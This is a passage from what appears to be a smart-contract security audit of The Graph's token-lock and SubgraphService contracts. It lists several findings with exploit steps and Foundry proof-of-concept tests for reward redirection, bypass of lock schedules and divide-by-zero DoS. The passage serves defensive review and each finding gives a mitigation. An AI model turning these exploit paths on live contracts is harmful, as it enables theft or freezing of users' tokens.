contract MockToken { mapping(address=>uint256) public balanceOf; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,"bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } }
contract LockHarness is GraphTokenLock { function init(address o,address b,address t,uint256 m,uint256 s,uint256 e,uint256 p,uint256 rs,uint256 c,IGraphTokenLock.Revocability r) external { _initialize(o,b,t,m,s,e,p,rs,c,r); } }
contract ZeroPeriodPOC is Test { function testZeroPeriodBlocksRevokeUntilFullyVested() public { MockToken t=new MockToken(); LockHarness lock=new LockHarness(); address owner=address(0xA11CE); address ben=address(0xB0B); lock.init(owner,ben,address(t),100 ether,1000,1010,11,0,0,IGraphTokenLock.Revocability.Enabled); t.mint(address(lock),100 ether); vm.prank(ben); lock.acceptLock(); vm.warp(1001); assertEq(lock.periodDuration(),0); vm.prank(owner); vm.expectRevert(); lock.revoke(); vm.warp(1011); vm.prank(ben); lock.release(); assertEq(t.balanceOf(ben),100 ether); assertEq(lock.releasedAmount(),100 ether); } }

## Suggested Mitigation
Reject schedules where _periods > _endTime - _startTime, or compute period duration with rounding up and explicitly handle zero. Add initialization tests for periods greater than duration and for every function that calls currentPeriod().


## [H-144]. Authorized provision operator can re-register an indexer and redirect SubgraphService rewards to an attacker payment destination

## id: 8kMMYiBCkFq88yaCWsttI

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
SubgraphService.register

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The mechanical code path exists: register(indexer,data) is callable by onlyAuthorizedForProvision(indexer), does not require msg.sender == indexer, does not distinguish first registration from metadata updates, and always calls _setPaymentsDestination(indexer,paymentsDestination_). _collectIndexingRewards() then passes paymentsDestination[_indexer] into _presentPoi(), while _encodeGraphTallyData() includes paymentsDestination for query-fee collection. No code-level safeguard prevents an authorized provision operator from overwriting the destination. The files and contract are in scope, and the behavior is currently reachable. However, exploitation as described requires an address already authorized for the indexer’s provision actions, i.e. a trusted/privileged operator role abusing or being compromised. Under the provided universal check, that makes the finding require a privileged or compromised actor, even though the underlying authorization boundary weakness is real.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
SubgraphService exposes a self-only payment-destination setter, but register() bypasses that boundary because any address passing onlyAuthorizedForProvision(indexer) can overwrite paymentsDestination[indexer], even when the indexer is already registered. The same operator role can then call collect(), causing query-fee payments and indexing rewards to use the attacker-controlled destination. Vulnerable snippet: function register(address indexer, bytes calldata data) external onlyAuthorizedForProvision(indexer) onlyValidProvision(indexer) whenNotPaused { (string memory url, string memory geohash, address paymentsDestination_) = abi.decode(data,(string,string,address)); ... indexers[indexer] = Indexer({ url: url, geoHash: geohash }); _setPaymentsDestination(indexer, paymentsDestination_); } and _collectIndexingRewards passes paymentsDestination[_indexer] into _presentPoi(), whose distribution path pushes the indexer share to _paymentsDestination.

## Impact
A malicious or compromised provision operator can redirect an indexer's liquid query fees and indexing rewards to itself. For large indexers, this can move significant GRT rewards or settled query fees away from the intended indexer/payment destination without owning the indexer address.

## Proof of Concept
1. An indexer authorizes an operator for provision actions so the operator can manage allocation lifecycle and collection. 2. The indexer registers with a legitimate paymentsDestination. 3. Rewards or query fees accrue to one of the indexer's allocations. 4. The operator calls register(indexer, abi.encode(url, geohash, attackerDestination)) for the already-registered indexer. 5. The operator calls collect(indexer, IndexingRewards, ...) or collect(indexer, QueryFee, ...). 6. SubgraphService reads the overwritten paymentsDestination[indexer] and routes the indexer's payment share to attackerDestination.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.33;

import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SubgraphServiceRegisterHarness {
    MockGRT public immutable grt;
    mapping(address => mapping(address => bool)) public authorized;
    mapping(address => address) public paymentsDestination;

    constructor(MockGRT grt_) {
        grt = grt_;
    }

    modifier onlyAuthorizedForProvision(address indexer) {
        require(msg.sender == indexer || authorized[indexer][msg.sender], "not authorized");
        _;
    }

    function authorize(address indexer, address operator, bool allowed) external {
        authorized[indexer][operator] = allowed;
    }

    function register(address indexer, bytes calldata data) external onlyAuthorizedForProvision(indexer) {
        (string memory url, string memory geohash, address destination) = abi.decode(data, (string, string, address));
        require(bytes(url).length > 0, "empty url");
        require(bytes(geohash).length > 0, "empty geohash");
        paymentsDestination[indexer] = destination;
    }

    function collectIndexingRewards(address indexer, uint256 amount) external onlyAuthorizedForProvision(indexer) returns (uint256) {
        address destination = paymentsDestination[indexer];
        require(destination != address(0), "restake path omitted");
        require(grt.transfer(destination, amount), "transfer failed");
        return amount;
    }
}

contract RegisterPaymentDestinationBypassPoC is Test {
    function testOperatorRedirectsIndexerRewardsThroughRegister() public {
        MockGRT grt = new MockGRT();
        SubgraphServiceRegisterHarness service = new SubgraphServiceRegisterHarness(grt);

        address indexer = address(0x1111);
        address operator = address(0x2222);
        address legitimateDestination = address(0x3333);
        address attackerDestination = address(0x4444);
        uint256 rewards = 1_500_000 ether;

        service.authorize(indexer, operator, true);
        grt.mint(address(service), rewards);

        vm.prank(indexer);
        service.register(indexer, abi.encode("https://indexer.example", "dr5reg", legitimateDestination));
        assertEq(service.paymentsDestination(indexer), legitimateDestination);

        vm.prank(operator);
        service.register(indexer, abi.encode("https://indexer.example", "dr5reg", attackerDestination));

        vm.prank(operator);
        service.collectIndexingRewards(indexer, rewards);

        assertEq(grt.balanceOf(attackerDestination), rewards);
        assertEq(grt.balanceOf(legitimateDestination), 0);
    }
}


## Suggested Mitigation
Do not allow register() to update paymentsDestination for an already-registered indexer unless msg.sender == indexer or a dedicated payment-admin permission is present. A minimal fix is to split registration metadata updates from payment-destination updates, keep setPaymentsDestination() as the only destination-changing path, and make it set paymentsDestination[msg.sender] only or validate an explicit payment-manager role.


## [M-145]. GraphTokenLock active schedule functions revert when periods exceed duration

## id: V1Y52aZlyMmnUmdeghPEi

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration / currentPeriod / availableAmount

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: GraphTokenLock._initialize accepts _periods >= 1 and _startTime < _endTime, with no _periods <= duration check. periodDuration returns duration / periods, so periods greater than duration makes periodDuration zero and currentPeriod divides by zero. The affected functions are in scoped production token-distribution code. No complete safeguard or documented acceptance exists. Triggering creation of such a schedule depends on the privileged lock creator/owner path, but the code path exists now.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The initializer requires only `_periods >= 1` and `_startTime < _endTime`; it never requires periods to fit inside the duration. If `_periods > _endTime - _startTime`, `periodDuration()` returns zero and `currentPeriod()` divides by zero. Vulnerable snippet: `function periodDuration() public view returns (uint256) { return duration().div(periods); } function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`. During the active schedule, availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() paths can revert.

## Impact
Affected wallets cannot compute or release scheduled funds during the active lock interval, and revocation paths that depend on vestedAmount can also revert. The lock only becomes usable after currentTime > endTime, causing a schedule-level custody DoS.

## Proof of Concept
1. Initialize a wallet with startTime=100, endTime=110, and periods=11. 2. Warp to timestamp 105, inside the active schedule. 3. periodDuration() is 0. 4. availableAmount() and releasableAmount() revert due to division by zero.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "../contracts/IGraphTokenLockManager.sol";
contract MockToken is IERC20 { uint256 public override totalSupply; mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; emit Transfer(address(0),to,amount); } function transfer(address to,uint256 amount) external override returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; } function approve(address spender,uint256 amount) external override returns(bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; } function transferFrom(address from,address to,uint256 amount) external override returns(bool){ require(balanceOf[from]>=amount); uint256 a=allowance[from][msg.sender]; require(a>=amount); if(a!=uint256(-1)){ allowance[from][msg.sender]=a-amount; } balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; } }
contract MockManager is IGraphTokenLockManager { IERC20 public t; constructor(IERC20 _t){t=_t;} function token() external override returns(IERC20){return t;} function setMasterCopy(address) external override {} function createTokenLockWallet(address,address,uint256,uint256,uint256,uint256,uint256,uint256,IGraphTokenLock.Revocability) external override {} function deposit(uint256) external override {} function withdraw(uint256) external override {} function addTokenDestination(address) external override {} function removeTokenDestination(address) external override {} function isTokenDestination(address) external view override returns(bool){return false;} function getTokenDestinations() external view override returns(address[] memory a){a=new address[](0);} function setAuthFunctionCall(string calldata,address) external override {} function unsetAuthFunctionCall(string calldata) external override {} function setAuthFunctionCallMany(string[] calldata,address[] calldata) external override {} function getAuthFunctionCallTarget(bytes4) external view override returns(address){return address(0);} function isAuthFunctionCall(bytes4) external view override returns(bool){return false;} }
contract GraphTokenLockDivideByZeroPoC is Test { MockToken token; MockManager manager; address owner=address(0xA11CE); address beneficiary=address(0xB0B); function setUp() public { token=new MockToken(); manager=new MockManager(IERC20(address(token))); } function testPeriodsGreaterThanDurationDosActiveSchedule() public { GraphTokenLockWallet w=new GraphTokenLockWallet(); token.mint(address(w),11 ether); w.initialize(address(manager),owner,beneficiary,address(token),11 ether,100,110,11,0,0,IGraphTokenLock.Revocability.Disabled); vm.warp(105); assertEq(w.periodDuration(),0); vm.expectRevert(); w.availableAmount(); vm.expectRevert(); w.releasableAmount(); } }

## Suggested Mitigation
In `_initialize`, require `_periods <= _endTime - _startTime` so periodDuration is never zero. Also consider computing with capped periods and explicitly handling active schedule edge cases rather than relying on integer division as a denominator.


## [M-146]. Invalid period count can brick active GraphTokenLock releases and revocations

## id: C7Kw-_9H62nDaSE5z9HOO

## Derived From Pattern/Invariant
ConfigFootgun: owner-configurable period count can brick flows without schedule sanity checks

## Exploit Type
Dos

## Location
GraphTokenLock._initialize / periodDuration / release / revoke

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The initializer and period math match the finding. _initialize only checks startTime < endTime and periods >= MIN_PERIOD. periodDuration floors duration / periods, so for periods greater than duration it returns zero. currentPeriod divides by periodDuration, causing any schedule path using passedPeriods or availableAmount to revert during the active schedule. release and revoke both reach that logic. There is no guard requiring nonzero periodDuration or capping periods. The file is in the token-distribution scope and the exact risk is not documented as intentional. The code is exploitable now with an accepted schedule, but the bad schedule must be introduced through the privileged owner/manager initialization flow. The issue is protocol validation failure, not solely user mistake, and it is not speculative.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLock accepts any _periods >= 1 while only requiring _startTime < _endTime. If _periods is greater than endTime - startTime, periodDuration() becomes zero and currentPeriod() divides by zero. Core schedule paths that call availableAmount(), releasableAmount(), vestedAmount(), release(), or revoke() then revert for the whole active schedule window. Vulnerable snippet: require(_startTime < _endTime, "Start time > end time"); require(_periods >= MIN_PERIOD, "Periods cannot be below minimum"); function periodDuration() public view returns (uint256) { return duration().div(periods); } function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }

## Impact
A valid-looking lock can enter a state where beneficiary releases and owner revocations are unavailable until currentTime() > endTime. For long vesting schedules, this can temporarily freeze locked GRT and block owner recovery of unvested tokens despite both roles following the exposed configuration interface.

## Proof of Concept
1. Owner initializes a lock with startTime=1000, endTime=1010, periods=11. 2. Initialization succeeds because periods only needs to be >= 1. 3. During the active window, periodDuration() returns 0. 4. release() and revoke() both reach currentPeriod()/passedPeriods() and revert due to division by zero, blocking progress until after endTime.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";
import "../contracts/IGraphTokenLock.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockGRT is ERC20 {
    constructor() ERC20("Graph", "GRT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract GraphTokenLockPeriodZeroPoC is Test {
    function testPeriodsGreaterThanDurationBricksReleaseAndRevoke() external {
        address beneficiary = address(0xBEEF);
        MockGRT token = new MockGRT();
        GraphTokenLockSimple lock = new GraphTokenLockSimple();
        lock.initialize(address(this), beneficiary, address(token), 100 ether, 1000, 1010, 11, 0, 0, IGraphTokenLock.Revocability.Enabled);
        token.mint(address(lock), 100 ether);

        assertEq(lock.periodDuration(), 0);
        vm.warp(1005);

        vm.prank(beneficiary);
        vm.expectRevert();
        lock.release();

        vm.expectRevert();
        lock.revoke();
    }
}


## Suggested Mitigation
Reject invalid schedules at initialization with require(_periods <= _endTime.sub(_startTime), "Period duration is zero") and preferably require duration to be cleanly representable or compute periods with capped/ceil-safe math. Also cap passedPeriods() to periods before multiplying.


## [M-147]. Initializer accepts schedules with zero periodDuration, breaking release and revoke during the active window

## id: I4edxIRUaIYDUphW3Qx2l

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath / StateMachine invariant: periodDuration() > 0

## Exploit Type
Dos

## Location
GraphTokenLock._initialize / currentPeriod

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The initializer lacks the claimed validation. It enforces nonzero start, startTime < endTime, and periods >= 1, but not periods <= duration. periodDuration is duration / periods, so it can be zero. currentPeriod divides by periodDuration, and the dependent schedule functions listed in the finding all exist and can reach that division while the schedule is active. No complete safeguard is present. The target is an in-scope GraphTokenLock source file and the exact risk is not documented as intentional. The bug is currently exploitable with today's code after a lock is initialized with the accepted boundary parameters. However, creating that lock requires the privileged owner/manager initialization path. It is not solely user mistake because the contract accepts an internally inconsistent configuration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The initializer requires only `_startTime < _endTime` and `_periods >= 1`; it does not require `_periods <= _endTime - _startTime`. If the period count exceeds the duration in seconds, `periodDuration()` returns zero. Any call path using `currentPeriod()` then divides by zero: `function periodDuration() public view override returns (uint256) { return duration().div(periods); } function currentPeriod() public view override returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`. This affects `passedPeriods()`, `availableAmount()`, `vestedAmount()`, `releasableAmount()`, `release()`, and `revoke()` during the active schedule.

## Impact
A validly initialized lock can become unusable throughout its vesting window: beneficiaries cannot release vested tokens and owners of revocable locks cannot revoke unvested tokens until after `endTime`. This is a functional lock DoS caused by accepted boundary parameters.

## Proof of Concept
1. Initialize a lock with `startTime=100`, `endTime=110`, and `periods=11`. 2. Initialization succeeds because start is before end and periods is at least one. 3. `duration()` is 10 and `periodDuration()` is 0. 4. During the active schedule, `releasableAmount()` and `release()` revert due to division by zero through `currentPeriod()`. 5. On revocable locks, `revoke()` also reverts because it calls `vestedAmount()` -> `availableAmount()`.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";
import "../contracts/IGraphTokenLock.sol";
contract MockToken { mapping(address=>uint256) public balanceOf; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,"bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } }
contract GraphTokenLockZeroPeriodTest is Test { function testZeroPeriodDurationDos() public { address owner=address(0xA11CE); address beneficiary=address(0xB0B); MockToken token=new MockToken(); GraphTokenLockSimple lock=new GraphTokenLockSimple(); lock.initialize(owner, beneficiary, address(token), 100 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(lock), 100 ether); assertEq(lock.periodDuration(), 0); vm.warp(105); vm.expectRevert(); lock.releasableAmount(); vm.prank(beneficiary); vm.expectRevert(); lock.release(); vm.prank(owner); vm.expectRevert(); lock.revoke(); } }

## Suggested Mitigation
Add `require(_periods <= _endTime.sub(_startTime), "Period duration cannot be zero")` in `_initialize`, or compute period duration using a nonzero rounded-up division while preserving `availableAmount() <= managedAmount`.


## [M-148]. GraphTokenLock schedules with periods greater than duration brick release paths until endTime

## id: Nmnjdcf3bctp8i9rgiUoi

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration/currentPeriod

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The root cause is present: _initialize allows any periods >= 1 while duration is endTime - startTime. If periods exceeds duration, periodDuration() returns zero and currentPeriod() divides by zero. That blocks passedPeriods(), availableAmount(), releasableAmount(), and release() during the active schedule. There is no guard that enforces nonzero period duration. The code is in the scoped token lock contracts. The bad schedule must be created through owner/manager-controlled initialization, so exploitation requires a privileged configuration path, but it is not explicitly by design or hypothetical.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Schedule initialization does not require the number of periods to fit into the duration in seconds. `_initialize` checks `_startTime < _endTime` and `_periods >= MIN_PERIOD`, but not `_periods <= _endTime - _startTime`. Vulnerable snippet: `function periodDuration() public view returns (uint256) { return duration().div(periods); }` followed by `function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`. If `periods > duration()`, `periodDuration()` is zero and `currentPeriod()` divides by zero. This makes `passedPeriods()`, `availableAmount()`, `releasableAmount()`, and `release()` unusable throughout the active schedule.

## Impact
A lock wallet can be created in a state where the beneficiary cannot release vested tokens during the schedule because release-related functions revert until after `endTime`. This is a functional freezing/DoS of the locked funds for the configured interval.

## Proof of Concept
1. A wallet is initialized with `startTime = 1000`, `endTime = 1010`, and `periods = 11`. 2. `duration()` is `10`, so `periodDuration()` returns `0`. 3. During the active schedule, for example at timestamp `1005`, `currentPeriod()` divides by zero. 4. Calls to `releasableAmount()` and `release()` revert, blocking scheduled withdrawals.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,"bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(allowance[from][msg.sender]>=amount,"allow"); require(balanceOf[from]>=amount,"bal"); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract MockManager { function getTokenDestinations() external pure returns(address[] memory list){ list = new address[](0); } function getAuthFunctionCallTarget(bytes4) external pure returns(address){ return address(0); } }
contract PeriodZeroPoC is Test { function testPeriodsGreaterThanDurationBricksRelease() public { MockToken token = new MockToken(); MockManager manager = new MockManager(); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100, 1000, 1010, 11, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 100); assertEq(wallet.periodDuration(), 0); vm.warp(1005); vm.expectRevert(); wallet.releasableAmount(); vm.expectRevert(); vm.prank(beneficiary); wallet.release(); } }

## Suggested Mitigation
Add `require(_periods <= _endTime - _startTime, "Period duration is zero");` during initialization. More defensively, require `periodDuration() > 0` and add tests for boundary schedules where periods exceed duration.


## [L-149]. Authorized token transfer selector lets beneficiaries bypass the lock schedule through fallback forwarding

## id: 0SVeziUG9ox6dvPkTZRxJ

## Derived From Pattern/Invariant
MaturityorGatingByPass / AccessControlOrAuthByPass: authorized fallback selectors can target the locked token itself

## Exploit Type
AuthByPass

## Location
GraphTokenLockManager / GraphTokenLockWallet.setAuthFunctionCall / fallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: _setAuthFunctionCall permits any contract target except the manager and does not reject the managed token or sensitive ERC20 selectors. The wallet fallback forwards beneficiary calls to the configured target, making the wallet the token caller. That can transfer or approve locked GRT outside release. The path is in scoped code and lacks a complete safeguard, but requires privileged manager configuration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockManager._setAuthFunctionCall() only rejects the manager itself and non-contract targets. It does not reject the managed GRT token or sensitive ERC20 selectors. If transfer(address,uint256) or approve(address,uint256) is authorized to the token address, GraphTokenLockWallet.fallback() forwards beneficiary calldata to the token with msg.sender equal to the wallet, allowing direct movement or approval of locked GRT outside release(). Vulnerable snippets: _setAuthFunctionCall requires _target != address(this) and Address.isContract(_target), then stores authFnCalls[sigHash] = _target; fallback loads manager.getAuthFunctionCallTarget(msg.sig) and calls Address.functionCall(_target, msg.data).

## Impact
A non-revocable wallet beneficiary can transfer or approve the wallet's locked GRT before vesting if an unsafe selector is present in the manager allowlist. This bypasses the token lock schedule and can prematurely release large locked balances.

## Proof of Concept
1. The manager owner authorizes transfer(address,uint256) with the GRT token as target. 2. A non-revocable wallet has locked GRT. 3. The beneficiary calls the wallet with calldata for transfer(attacker, amount). 4. fallback forwards the calldata to the token contract. 5. The token observes msg.sender as the wallet and transfers locked tokens directly, without release schedule checks.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockERC20 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; uint256 public totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract UnsafeAuthPoC is Test { MockERC20 token; GraphTokenLockManager manager; GraphTokenLockWallet wallet; address beneficiary=address(0xB0B); address attacker=address(0xA11CE); function setUp() public { token=new MockERC20(); GraphTokenLockWallet impl=new GraphTokenLockWallet(); manager=new GraphTokenLockManager(IERC20(address(token)),address(impl)); manager.setAuthFunctionCall("transfer(address,uint256)",address(token)); wallet=new GraphTokenLockWallet(); wallet.initialize(address(manager),address(this),beneficiary,address(token),60 ether,1000,2000,1,0,0,IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet),60 ether); } function testBeneficiaryTransfersLockedTokensViaFallback() public { vm.prank(beneficiary); (bool ok,)=address(wallet).call(abi.encodeWithSignature("transfer(address,uint256)",attacker,60 ether)); assertTrue(ok); assertEq(token.balanceOf(attacker),60 ether); } }

## Suggested Mitigation
Block dangerous token selectors from being authorized to the managed token, including transfer, approve, transferFrom, increaseAllowance, decreaseAllowance, and permit-like selectors. Prefer a positive allowlist of protocol contracts and selectors reviewed for custody effects.


## [L-150]. Non-contract masterCopy lets manager fund unusable minimal proxies

## id: CuyXqVpz5cARhVC0xvGUY

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift: factory master copy can be set to a non-contract implementation

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
GraphTokenLockManager.setMasterCopy / createTokenLockWallet

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The manager accepts a nonzero masterCopy without checking code size. createTokenLockWallet deploys an EIP-1167 proxy, calls the initializer through the proxy, and transfers managed GRT. If the implementation has no code, initialization does not set wallet state. No code-existence or post-initialization state check fully blocks this. The exploit path requires the trusted manager owner.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
setMasterCopy() only checks that the address is nonzero. It does not require Address.isContract(_masterCopy). createTokenLockWallet() then deploys an EIP-1167 proxy pointing to masterCopy, calls the initializer through the proxy, and transfers managed GRT to the proxy. If masterCopy has no code, the proxy delegatecall succeeds with no initialization logic, leaving a funded proxy that cannot execute GraphTokenLockWallet behavior. Vulnerable snippet: setMasterCopy only requires _masterCopy != address(0); createTokenLockWallet calls _deployProxy2(..., masterCopy, initializer) and then _token.safeTransfer(contractAddress, _managedAmount).

## Impact
A valid owner call can accidentally strand managed GRT in proxies that do not initialize and cannot release, revoke, or withdraw tokens. This is an admin-triggered factory safety failure rather than a permissionless exploit.

## Proof of Concept
1. The manager owner sets masterCopy to a nonzero EOA or address with no code. 2. The manager is funded with GRT. 3. The owner calls createTokenLockWallet(). 4. The minimal proxy is deployed and initializer call does not initialize wallet storage because the implementation has no code. 5. The manager transfers managedAmount to the proxy, where calls such as release() do nothing and the balance remains stuck.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockERC20 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; uint256 public totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract BadMasterCopyPoC is Test { MockERC20 token; GraphTokenLockManager manager; address beneficiary=address(0xB0B); function testNonContractMasterCopyStrandsFunds() public { token=new MockERC20(); GraphTokenLockWallet validImpl=new GraphTokenLockWallet(); manager=new GraphTokenLockManager(IERC20(address(token)),address(validImpl)); address badImpl=address(0x1234); manager.setMasterCopy(badImpl); token.mint(address(manager),100 ether); bytes memory initializer=abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector,address(manager),address(this),beneficiary,address(token),100 ether,1000,2000,1,0,0,IGraphTokenLock.Revocability.Disabled); address predicted=manager.getDeploymentAddress(keccak256(initializer),badImpl); manager.createTokenLockWallet(address(this),beneficiary,100 ether,1000,2000,1,0,0,IGraphTokenLock.Revocability.Disabled); assertEq(token.balanceOf(predicted),100 ether); vm.prank(beneficiary); (bool ok,)=predicted.call(abi.encodeWithSignature("release()")); assertTrue(ok); assertEq(token.balanceOf(predicted),100 ether); } }

## Suggested Mitigation
Require Address.isContract(_masterCopy) in setMasterCopy(). After deploying a proxy, verify the initializer actually set expected state such as manager, token, managedAmount, owner, beneficiary, and isInitialized before transferring tokens.


## [L-151]. Authorized token transfer selectors let beneficiaries bypass lock release schedule

## id: _xEF4gfOWYe92b0eM_58j

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
GraphTokenLockWallet.fallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: GraphTokenLockWallet.fallback lets the beneficiary forward allowed selectors to the manager-configured target with msg.sender as the wallet. _setAuthFunctionCall only rejects the manager and non-contract targets; it does not reject the locked token or ERC20 transfer/approval selectors. Thus an unsafe authorized selector can move locked GRT outside release accounting. The missing safeguard is real, but enabling the path requires privileged manager configuration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockManager._setAuthFunctionCall() only checks that the target is a contract and not the manager. It does not prevent authorizing the locked token itself for selectors such as transfer(address,uint256), approve(address,uint256), or transferFrom(address,address,uint256). Because GraphTokenLockWallet.fallback() forwards beneficiary calldata to the configured target with the wallet as msg.sender, an authorized token transfer selector lets the beneficiary move or approve locked GRT directly, bypassing release(), releasableAmount(), and the vesting schedule. Vulnerable snippets: `_setAuthFunctionCall(...){ require(Address.isContract(_target), "Target must be a contract"); authFnCalls[sigHash] = _target; }` and `fallback() external { ... address _target = manager.getAuthFunctionCallTarget(msg.sig); ... Address.functionCall(_target, msg.data); }`.

## Impact
If the manager configuration authorizes a raw GRT token transfer or approval selector, beneficiaries of non-revocable wallets can immediately transfer or approve locked tokens before maturity, defeating token-distribution restrictions.

## Proof of Concept
1. The manager owner authorizes `transfer(address,uint256)` with target equal to the GRT token. 2. A non-revocable wallet is created and funded. 3. Before any tokens are releasable, the beneficiary calls the wallet with calldata for token.transfer(attacker, amount). 4. fallback() forwards the calldata to GRT, where msg.sender is the wallet. 5. The locked GRT is transferred out without calling release().

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockGRT is ERC20 { constructor() ERC20("GRT","GRT") { _mint(msg.sender, 1e30); } }
